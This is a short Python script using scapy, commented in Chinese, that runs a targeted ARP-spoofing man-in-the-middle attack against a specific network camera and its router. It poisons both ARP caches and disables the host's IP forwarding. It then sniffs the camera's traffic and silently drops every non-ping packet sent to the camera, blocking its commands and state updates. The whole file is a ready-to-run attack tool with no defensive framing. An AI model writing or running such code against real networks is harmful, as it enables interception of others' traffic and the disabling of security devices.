#drop command / state-update

from scapy.all import *
import os
import sys
import threading
import time

# ================= 配置区域 =================
CAMERA_IP = "192.168.0.61"
CAMERA_MAC = "04:cf:8c:08:b9:18"
ROUTER_IP = "192.168.0.1"
ROUTER_MAC = "50:64:2b:40:6c:54" # 确认路由器的真实 MAC
IFACE = "en0" # MacBook 的网卡接口
MY_MAC = get_if_hwaddr(IFACE)
# ===========================================

def arp_poison():
    """定向欺骗：只针对摄像头和路由器"""
    # 告诉摄像头：我是路由器 (psrc是路由器IP, hwsrc是我的MAC)
    pkt_cam = Ether(dst=CAMERA_MAC)/ARP(op=2, psrc=ROUTER_IP, pdst=CAMERA_IP, hwsrc=MY_MAC)
    # 告诉路由器：我是摄像头 (psrc是摄像头IP, hwsrc是我的MAC)
    pkt_router = Ether(dst=ROUTER_MAC)/ARP(op=2, psrc=CAMERA_IP, pdst=ROUTER_IP, hwsrc=MY_MAC)
    
    print(f"[*] 正在启动定向 ARP 欺骗... 目标: {CAMERA_IP}")
    while True:
        try:
            sendp(pkt_cam, verbose=False, iface=IFACE)
            sendp(pkt_router, verbose=False, iface=IFACE)
            time.sleep(2)
        except Exception as e:
            print(f"ARP Error: {e}")


def packet_handler(pkt):
    if not pkt.haslayer(IP): return

    # 1. 凡是发往摄像头的，除了 ICMP(ping)，全部丢弃不转发
    if pkt[IP].dst == CAMERA_IP and not pkt.haslayer(ICMP):
        print(f"[*] 发现下行数据包，拦截并丢弃")
        return 

    # 2. 转发逻辑
    if pkt[Ether].dst == MY_MAC:
        if pkt[IP].dst == CAMERA_IP:
            pkt[Ether].dst = CAMERA_MAC
            sendp(pkt, verbose=False, iface=IFACE)
        elif pkt[IP].dst == ROUTER_IP:
            pkt[Ether].dst = ROUTER_MAC
            sendp(pkt, verbose=False, iface=IFACE)


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] 请使用 sudo 运行")
        sys.exit(1)

    # 关闭系统自带的转发，完全由本脚本手动控制 Drop
    os.system("sysctl -w net.inet.ip.forwarding=0")

    t = threading.Thread(target=arp_poison)
    t.daemon = True
    t.start()

    print(f"[*] 正在监听 {IFACE} 上的摄像头流量...")
    # 只嗅探与摄像头相关的流量，减少 CPU 占用
    sniff(iface=IFACE, prn=packet_handler, filter=f"host {CAMERA_IP}", store=0)